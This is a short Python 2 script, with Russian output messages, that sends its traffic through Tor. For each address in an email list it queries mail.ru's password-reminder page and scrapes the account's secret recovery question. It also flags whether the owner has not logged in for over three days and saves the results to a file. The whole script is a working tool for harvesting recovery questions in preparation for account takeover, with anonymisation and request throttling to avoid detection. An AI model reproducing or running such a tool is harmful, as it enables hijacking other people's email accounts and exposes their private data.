# -*- coding: utf-8 -*-
import sys
import socks
import socket
import urllib
import urllib2
import re
import time
socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 9150)
socket.socket = socks.socksocket
# print urllib2.urlopen('http://whoer.net').read().decode('utf-8')
# sys.exit(0)
f = open('emails.txt', 'r')
emails = f.read().splitlines()
f.close()
data2save = ''
for email in emails:
    print u'Проверяем ' + email
    username, domain = email.split('@')
    payload = {
        'action': 'login', 
        'lang': '', 
        'Username': username, 
        'Domain': domain
    }
    try:
        payload = urllib.urlencode(payload)
        req = urllib2.Request('http://m.mail.ru/cgi-bin/passremind', payload, {
            'Content-Type': 'application/x-www-urlencoded'
        })
        res = urllib2.urlopen(req, timeout=5)
        if 200 == res.code:
            content = res.read().decode('utf-8')
            match = re.search(ur'Ответьте на секретный вопрос:[\s\S]+?label([^>]+)?>([^<]+)</label', content)
            if match:
                not_logged = ['-', '+'][int(match.group(1) != ' style="color:#ccc;"')]
                secret = match.group(2)
                # + не заходил более 3-х дней
                print u'Секретный вопрос: ' + secret + ' ' + not_logged
                data2save += email + '\t' + secret + '\t' + not_logged + '\n'
            else:
                print u'Секретный вопрос не установлен'
        else:
            print u'Ошибка сервера'
    except Exception, e:
        print str(e)
    time.sleep(5)
filename = 'secret/%s.txt' % str(time.time()).split('.')[0]
open(filename, 'w').write(data2save.encode('utf-8'))